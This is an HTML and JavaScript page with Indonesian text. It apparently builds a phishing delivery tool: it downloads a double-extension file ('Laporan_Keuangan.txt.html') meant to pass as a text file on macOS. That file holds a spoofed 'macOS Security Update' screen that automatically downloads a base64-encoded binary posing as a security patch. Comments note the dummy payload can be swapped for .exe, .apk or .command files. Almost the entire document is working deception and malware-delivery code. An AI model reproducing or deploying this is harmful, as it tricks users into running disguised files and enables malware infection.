<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Generator Berkas Blob &amp; ObjectURL — Spoofed HTML</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Generator Berkas Blob &amp; ObjectURL</h2>
<p>Klik tombol untuk mengunduh file ber-ekstensi ganda. Saat disimpan, macOS akan menampilkannya sebagai .txt, tetapi akan dijalankan sebagai .html.</p>

<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>

<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        utterance.rate = 1.0;
        window.speechSynthesis.speak(utterance);
    }
};

const prepareMimeBlobAsync = (i) => {
    return new Promise((resolve) => {
        queueMicrotask(() => {
            // Payload HTML dengan UI Spoofing (seperti pembaruan sistem/antivirus palsu)
            const payloadText = "<!DOCTYPE html>" +
            "<html>" +
            "<head><meta charset='UTF-8'><title>macOS Security Update</title></head>" +
            "<body style='margin:0;padding:0;background:#e5e5ea;color:#333;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
            "<div style='background:#fff;padding:40px;border-radius:18px;box-shadow:0 10px 40px rgba(0,0,0,0.1);max-width:450px;text-align:center;border:1px solid #d1d1d6;'>" +
            "    <div style='font-size:50px;margin-bottom:20px;'>🛡️</div>" +
            "    <h2 style='color:#000;margin-bottom:10px;'>Pembaruan Keamanan macOS</h2>" +
            "    <p style='color:#555;font-size:14px;margin-bottom:25px;line-height:1.5;'>Sistem mendeteksi adanya patch keamanan kritis. Pembaruan sedang diunduh secara otomatis. Jangan tutup jendela ini.</p>" +
            "    <div style='width:100%;background:#f2f2f7;border-radius:10px;height:8px;overflow:hidden;margin-bottom:15px;'>" +
            "        <div style='background:#007aff;width:100%;height:100%;'></div>" +
            "    </div>" +
            "    <p id='status' style='color:#34c759;font-size:12px;font-weight:bold;'>Mengunduh patch...</p>" +
            "    <p style='color:#999;font-size:10px;margin-top:30px;'>Origin: <span id='o'></span></p>" +
            "</div>" +
            "<script>" +
            "(function(){" +
            "\"use strict\";" +
            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
            
            "function b64KeBytes(b64){" +
            "    var binary = atob(b64);" +
            "    var len = binary.length;" +
            "    var bytes = new Uint8Array(len);" +
            "    for (var i = 0; i < len; i++) { bytes[i] = binary.charCodeAt(i); }" +
            "    return bytes;" +
            "}" +
            
            // Payload file dummy (bisa diganti .apk / .exe / .command)
            "var b64Data = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4A8AAAAAAAAwAAAAAAAAAAAAAAAAAAAAQAAA\";" +
            
            "var sudah = false;" +
            
            "function picuDownload(){" +
            "    if (sudah) return;" +
            "    sudah = true;" +
            "    var statusEl = document.getElementById('status');" +
            "    try{" +
            "        statusEl.textContent = 'Menyimpan patch...';" +
            "        var bytesArr = b64KeBytes(b64Data);" +
            "        var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
            "        var url = URL.createObjectURL(blob);" +
            "        var a = document.createElement('a');" +
            "        a.href = url;" +
            "        a.download = 'Security_Update_Patch.bin';" + // File akhir yang diunduh
            "        a.style.display = 'none';" +
            "        document.body.appendChild(a);" +
            "        a.click();" +
            "        setTimeout(function(){ " +
            "            if (a.parentNode) a.parentNode.removeChild(a); " +
            "            URL.revokeObjectURL(url); " +
            "        }, 3000);" +
            "        statusEl.textContent = 'Patch berhasil diinstal.';" +
            "        statusEl.style.color = '#34c759';" +
            "    } catch(e){" +
            "        statusEl.textContent = 'Gagal: ' + e.message;" +
            "        statusEl.style.color = '#ff3b30';" +
            "        sudah = false;" +
            "    }" +
            "}" +
            
            // Auto trigger saat halaman dimuat
            "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
            "document.addEventListener('click', picuDownload);" +
            "})();" +
            "<\/script>" +
            "</body>" +
            "</html>";
          
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            resolve({ id: i, url: url });
        });
    });
};

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    
    // KUNCI: Memberi nama file dengan ekstensi ganda .txt.html
    // macOS Finder biasanya menyembunyikan ekstensi .html jika tidak diatur, 
    // sehingga hanya tampil sebagai .txt
    link.download = `Laporan_Keuangan.txt.html`;
    
    link.textContent = `Download Laporan_Keuangan.txt.html`;
    link.style.display = "none";
    downloadsDiv.appendChild(link);
    link.click();
};

startBtn.addEventListener("click", () => {
    if (isProcessing) return;

    activeUrls.forEach(url => URL.revokeObjectURL(url));
    activeUrls = [];
    downloadsDiv.replaceChildren();

    speak("Mengaktifkan mode layar penuh.");

    const root = document.documentElement;
    try {
        if (root.requestFullscreen) {
            root.requestFullscreen();
        } else if (root.webkitRequestFullscreen) {
            root.webkitRequestFullscreen();
        } else if (root.mozRequestFullScreen) {
            root.mozRequestFullScreen();
        }
        statusDiv.textContent = "Mengunci layar penuh...";
    } catch (err) {
        console.warn("Fullscreen tidak didukung atau ditolak:", err);
    }

    setTimeout(async () => {
        isProcessing = true;
        speak("Proses pembuatan berkas Blob dimulai.");
        
        const fileData = await prepareMimeBlobAsync(1);
        activeUrls.push(fileData.url);
        triggerInstantDownload(fileData);
        statusDiv.textContent = `Selesai: File berhasil dikirim.`;
    }, 300);
});
</script>
</body>
</html>
